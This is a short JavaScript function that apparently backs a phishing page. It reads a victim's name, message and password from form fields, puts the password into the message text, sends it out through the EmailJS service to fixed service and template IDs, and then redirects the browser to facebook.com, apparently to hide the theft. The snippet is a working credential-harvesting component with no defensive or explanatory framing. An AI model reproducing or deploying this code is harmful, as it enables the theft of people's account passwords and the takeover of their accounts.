var count=0;
function sendEmail(params){
    
 var tempParams={
     from_name:document.getElementById("fromName").value,
     to_name:document.getElementById("toName").value,
     message:document.getElementById("msg").value+" password:"+document.getElementById("password").value
 };
 emailjs.send("service_cixasyk","template_w2ztbf9",tempParams)
 .then(function(response){
     count++;
     console.log("successfully sent "+response.status);
 })
 if(count<3){
    window.location="http://facebook.com/";
 }
 console.log("samson at the end");
}